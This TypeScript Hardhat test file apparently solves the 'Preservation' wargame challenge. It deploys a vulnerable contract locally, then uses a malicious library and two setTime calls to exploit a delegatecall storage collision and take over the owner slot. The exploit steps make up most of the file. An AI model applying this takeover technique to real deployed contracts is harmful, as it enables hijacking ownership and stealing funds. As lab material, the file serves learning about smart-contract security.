import { expect } from "chai";
import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { ethers } from "hardhat";
import { BigNumberish } from "ethers";

describe("TimeZone", function () {
  async function deployFixture() {
    const [player, owner] = await ethers.getSigners();

    const LibraryContract = await ethers.deployContract("LibraryContract");
    await LibraryContract.waitForDeployment();
    const LibraryContractAddr = LibraryContract.target;
    console.log("Адрес библиотечного контракта:", LibraryContractAddr);

    const Preservation = await ethers.deployContract("Preservation", [
      LibraryContractAddr,
      owner,
    ]);
    await Preservation.waitForDeployment();
    const PreservationAddr = Preservation.target;
    console.log("Адрес основного контракта:", PreservationAddr);

    return { Preservation, player };
  }

  it("hack", async function () {
    const { Preservation, player } = await loadFixture(deployFixture);

    const MaliciousLibrary = await ethers.deployContract("MaliciousLibrary");
    await MaliciousLibrary.waitForDeployment();
    console.log("Address of MaliciousLibrary: ", MaliciousLibrary.target);

    console.log("owner before ", await Preservation.owner());
    console.log(
      "timeZoneLibrary before ",
      await Preservation.timeZoneLibrary()
    );

    await Preservation.connect(player).setTime(MaliciousLibrary.target as BigNumberish);

    console.log("owner after 1", await Preservation.owner());
    console.log(
      "timeZoneLibrary after 1",
      await Preservation.timeZoneLibrary()
    );

    await Preservation.connect(player).setTime(player.address);

    console.log("owner after 2", await Preservation.owner());
    console.log(
      "timeZoneLibrary after 2",
      await Preservation.timeZoneLibrary()
    );

    // теперь владелец контракта player, а не owner
    expect(await Preservation.owner()).to.equal(player);
  });
});
